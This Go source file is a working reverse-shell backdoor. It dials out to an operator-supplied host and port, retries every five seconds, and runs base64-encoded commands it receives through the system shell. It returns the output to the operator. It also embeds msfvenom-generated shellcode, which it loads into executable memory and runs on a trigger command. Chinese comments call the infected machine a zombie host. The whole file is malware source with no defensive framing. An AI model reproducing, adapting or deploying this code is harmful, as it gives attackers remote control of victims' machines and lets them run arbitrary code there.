package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"reflect"
	"runtime"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32       = syscall.MustLoadDLL("kernel32.dll")
	ntdll          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
	shellcode_calc = []byte{
		//msfvenom -f chsarp  -p windows/x64/exec CMD=calc.exe //-o 64.bin

		0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54,
		0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76,
		0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17,
		0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17,
		0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F,
		0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4,
		0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3,
	}
)

func main() {

	flag.Parse()
	if flag.NArg() != 2 {
		fmt.Println("usage: host port")
		os.Exit(0)
	}
	hostAndPort := fmt.Sprintf("%s:%s", flag.Arg(0), flag.Arg(1))

	for {
		conn, err := net.Dial("tcp", hostAndPort)
		if err != nil {
			time.Sleep(5 * time.Second)
		} else {
			for {
				message, _ := bufio.NewReader(conn).ReadString('\n')
				if len(message) >= 1 {
					message := base64Decode(string(message))
					fmt.Println(message) //客户端肉鸡也显示
					//这里可以写别的命令，待以后加
					if message == "shellcode" {
						ThreadExecute(shellcode_calc)
					}
					if message == "exit" {

						os.Exit(0)
					} else {
						var cmd *exec.Cmd
						if runtime.GOOS == "windows" {
							cmd = exec.Command("cmd", "/C", message)
						} else {
							list := strings.Split(message, " ")
							cmd = exec.Command(list[0], list[1:]...) //list[1:]后有多少个元素，就传多少个元素过去

						}
						cmd.SysProcAttr = &syscall.SysProcAttr{} //HideWindow: true
						out, err := cmd.Output()
						fmt.Println(string(out))         //[]uint8与字符串互转
						fmt.Println(reflect.TypeOf(out)) //[]uint8

						if err != nil {
							s := base64Encode(string("Error running command."+err.Error())) + "\n"
							fmt.Fprintf(conn, s)
						} else {
							for len(out) >= 1 {
								fmt.Fprintf(conn, base64Encode(string(out))+"\n")
								break
							}
						}
					}
				}
			}
		}
	}
}

func base64Encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}

func ThreadExecute(Shellcode []byte) {
	shellcode := shellcode_calc
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	syscall.Syscall(addr, 0, 0, 0, 0)
	os.Exit(1)

}
